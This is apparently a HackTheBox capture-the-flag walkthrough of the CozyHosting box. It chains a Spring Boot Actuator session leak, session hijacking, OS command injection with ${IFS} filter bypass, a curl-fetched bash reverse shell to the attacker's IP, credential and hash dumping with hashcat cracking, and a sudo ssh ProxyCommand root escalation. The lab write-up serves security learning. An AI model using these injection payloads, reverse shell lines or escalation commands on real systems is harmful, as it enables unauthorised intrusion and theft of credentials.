---
title: HTB-CozyHosting
date: 2026-08-22 02:10:00 +0300
categories: [Linux, Web Application]
tags: [htb,command injection, directory brute force, space bypass, filter evasion technique, waf/filter bypass]     # TAG names should always be lowercase
---
![HTB-CozyHosting](/assets/img/HTB/CozyHosting/Logo2.jpg){: width="2400" height="1200" }

#HTB CozyHosting — Walkthrough

CozyHosting is a Linux box on HackTheBox that chains a Spring Boot (Java framework) Actuator misconfiguration into session hijacking, OS command injection, and a final privilege escalation via a `sudo` misconfiguration on `ssh`. Here's how I worked through it.

## Enumeration

I started with the usual recon: `nmap` for open ports and services using a quick stealth search for all open tcp ports:
```bash
┌──(HoDHoD㉿kali)-[~/Desktop/HTB/CozyHosting]
└─$ nmap 10.129.36.130 -p- -sS -T5 -Pn
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-27 09:11 -0400
Nmap scan report for 10.129.36.130
Host is up (0.11s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```
looking further into the services and their versions:
```bash
┌──(HoDHoD㉿kali)-[~/Desktop/HTB/CozyHosting]
└─$ nmap 10.129.36.130 -p 22,80  -sV       
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-27 09:28 -0400
Nmap scan report for 10.129.36.130
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Will start with web application at port tcp/80 which shows a static website called "Cozy Hosting" with a login page.
#add website photo and login page snips.
Running quick `hydra` attempt against the login form (which didn't yield anything — no combination of credentials worked there).
Now running directory brute force with `feroxbuster`:
```bash
┌──(HoDHoD㉿kali)-[~/Desktop/HTB/CozyHosting]
└─$ feroxbuster -u http://cozyhosting.htb
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://cozyhosting.htb/
 🚩  In-Scope Url          │ cozyhosting.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/feroxbuster/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        1l        2w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
204      GET        0l        0w        0c http://cozyhosting.htb/logout
401      GET        1l        1w       97c http://cozyhosting.htb/admin
500      GET        1l        1w       73c http://cozyhosting.htb/error
200      GET      295l      641w     6890c http://cozyhosting.htb/assets/js/main.js
200      GET       29l      174w    14774c http://cozyhosting.htb/assets/img/pricing-ultimate.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/favicon.png
200      GET       29l      131w    11970c http://cozyhosting.htb/assets/img/pricing-free.png
200      GET       34l      172w    14934c http://cozyhosting.htb/assets/img/pricing-starter.png
200      GET       38l      135w     8621c http://cozyhosting.htb/assets/img/logo.png
200      GET       43l      241w    19406c http://cozyhosting.htb/assets/img/pricing-business.png
200      GET       79l      519w    40905c http://cozyhosting.htb/assets/img/values-2.png
200      GET       73l      470w    37464c http://cozyhosting.htb/assets/img/values-1.png
200      GET       83l      453w    36234c http://cozyhosting.htb/assets/img/values-3.png
200      GET        1l      313w    14690c http://cozyhosting.htb/assets/vendor/aos/aos.js
200      GET        1l      218w    26053c http://cozyhosting.htb/assets/vendor/aos/aos.css
200      GET       81l      517w    40968c http://cozyhosting.htb/assets/img/hero-img.png
200      GET        1l      625w    55880c http://cozyhosting.htb/assets/vendor/glightbox/js/glightbox.min.js
200      GET     2397l     4846w    42231c http://cozyhosting.htb/assets/css/style.css
200      GET        7l     1222w    80420c http://cozyhosting.htb/assets/vendor/bootstrap/js/bootstrap.bundle.min.js
200      GET       14l     1684w   143706c http://cozyhosting.htb/assets/vendor/swiper/swiper-bundle.min.js
200      GET     2018l    10020w    95609c http://cozyhosting.htb/assets/vendor/bootstrap-icons/bootstrap-icons.css
200      GET        7l     2189w   194901c http://cozyhosting.htb/assets/vendor/bootstrap/css/bootstrap.min.css
200      GET       97l      196w     4431c http://cozyhosting.htb/login
200      GET      285l      745w    12706c http://cozyhosting.htb/index
200      GET      285l      745w    12706c http://cozyhosting.htb/
400      GET        1l       32w      435c http://cozyhosting.htb/plain]
400      GET        1l       32w      435c http://cozyhosting.htb/[
400      GET        1l       32w      435c http://cozyhosting.htb/]
400      GET        1l       32w      435c http://cozyhosting.htb/quote]
400      GET        1l       32w      435c http://cozyhosting.htb/extension]
400      GET        1l       32w      435c http://cozyhosting.htb/[0-9]
[####################] - 2m     30037/30037   0s      found:31      errors:0      
[####################] - 2m     30000/30000   247/s   http://cozyhosting.htb/ 
```
> HTTP codes for result are as follows:
> 
> 200 – OK  
> 204 – No Content  
> 400 – Bad Request  
> 401 – Unauthorized  
> 404 – Not Found  
> 500 – Internal Server Error
{: .prompt-info }

While poking around, navigating to `http://cozyhosting.htb/error` it returned **Whitelabel Error Page**.
#add white label error of spring boot

Looking online for this page and found that it is a spring boot, Java framework used to build web application, where its old versions are known to leak information.

## Finding the Actuator Endpoints

With Spring Boot confirmed, I fuzzed for Actuator-specific paths using a wordlist built for exactly this purpose:

- [SecLists — Java-Spring-Boot.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/Programming-Language-Specific/Java-Spring-Boot.txt)

```bash
ffuf -c -w spring-boot.txt -u http://cozyhosting.htb/FUZZ
```

This turned up several live endpoints, including:

```python
actuator
actuator/mappings
actuator/env
actuator/env/lang
actuator/env/path
actuator/env/home
actuator/health
actuator/sessions
actuator/beans
```

The `actuator/sessions` endpoint was the goldmine — Spring Boot's Actuator module exposes active session IDs when it's improperly configured. It revealed:

```
249ADA95FF84A470BDF4EC3105239A87	"kanderson"
```

## Session Hijacking

Trying that session cookie against the `/login` endpoint just kept reloading the login page. But swapping it in at `/admin` worked — I was logged in as `kanderson`, straight into the admin panel.

## From Admin Panel to Command Injection

Inside the admin dashboard, there was a feature to execute SSH connections against a host, backed by a `POST /executessh` request that took two parameters: `Hostname` and `Username`.

Testing with my own IP as the hostname and a lone `;` as the username threw an error identical to running plain `ssh ;` on the command line — a strong signal the backend was shelling out to the system `ssh` binary and passing user input unsanitized.

I confirmed command injection by triggering a ping back to my machine:

```
username=;ping${IFS}-c${IFS}1${IFS}10.10.14.120;
```

*(Spaces weren't accepted, so `${IFS}` — Bash's Internal Field Separator — was used as a stand-in.)*

Listening with `tcpdump` confirmed the ICMP round trip:

```
14:50:11.429266 IP cozyhosting.htb > 10.10.14.120: ICMP echo request, id 10, seq 1, length 64
14:50:11.429306 IP 10.10.14.120 > cozyhosting.htb: ICMP echo reply, id 10, seq 1, length 64
```

## Getting a Shell

A one-liner reverse shell (`bash -i >& /dev/tcp/...`) wasn't cooperating through the injection point, so instead I hosted a small script and pulled it down:

**rev.sh**
```bash
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.120/1222 0>&1
```

The current working directory had no write permissions, so I dropped the file into `/tmp` instead:

```
username=;curl${IFS}http://10.10.14.120:111/rev.sh${IFS}-o${IFS}/tmp/rev.sh;
```

Then executed it:

```
username=;bash${IFS}/tmp/rev.sh;
```

Catching it on a listener landed a shell as `app`:

```bash
nc -nvlp 1222
# ...
app@cozyhosting:/app$
```

## Digging Through the Application

From the app directory, I pulled down `cloudhosting-0.0.1.jar` and unzipped it locally to inspect the source. A quick grep for credentials paid off:

```
./BOOT-INF/classes/application.properties:spring.datasource.password=Vg&nvzAQ7XxR
```

The full config confirmed a local PostgreSQL database:

```properties
spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
spring.datasource.username=postgres
spring.datasource.password=Vg&nvzAQ7XxR
```

## Raiding the Database

Using those credentials to connect to Postgres from the reverse shell:

```bash
psql -h localhost -p 5432 -d cozyhosting -U postgres -W
```

The `users` table held bcrypt password hashes for two accounts:

```
name     | kanderson
password | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim
role     | User

name     | admin
password | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm
role     | Admin
```

## Cracking the Hash

The admin hash cracked quickly against `rockyou.txt` with `hashcat`:

```bash
hashcat -m 3200 admin_hash /usr/share/wordlists/rockyou.txt
```

Result:

```
$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
```

That password turned out to belong to the system user `josh`, and worked over SSH — giving me the user flag.

## Privilege Escalation to Root

A quick `sudo -l` check as `josh` revealed a dangerously broad permission:

```
User josh may run the following commands on localhost:
    (root) /usr/bin/ssh *
```

Being able to run `ssh` as root with arbitrary arguments is a well-known escalation path documented on [GTFOBins](https://gtfobins.github.io/gtfobins/ssh/). Abusing the `ProxyCommand` option gets an arbitrary command executed as root before the SSH connection is even attempted:

```bash
sudo ssh -o ProxyCommand=';/bin/sh 0<&2 1>&2' x
```

That dropped me straight into a root shell:

```
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Summary

| Stage | Technique |
|---|---|
| Recon | Spring Boot fingerprinting via Whitelabel Error Page |
| Enumeration | Actuator endpoint fuzzing (`/actuator/sessions`) |
| Access | Session ID hijacking to reach `/admin` |
| Foothold | OS command injection via `/executessh` |
| Lateral movement | Credentials recovered from `.jar` source + Postgres DB dump |
| Privilege escalation | `sudo` misconfiguration on `/usr/bin/ssh` (GTFOBins) |

CozyHosting is a great reminder of two things: how much Spring Boot Actuator endpoints can leak when they're left exposed, and how a single overly permissive `sudo` rule can undo an otherwise solid setup. Definitely a fun one for anyone practicing web-to-root chains.
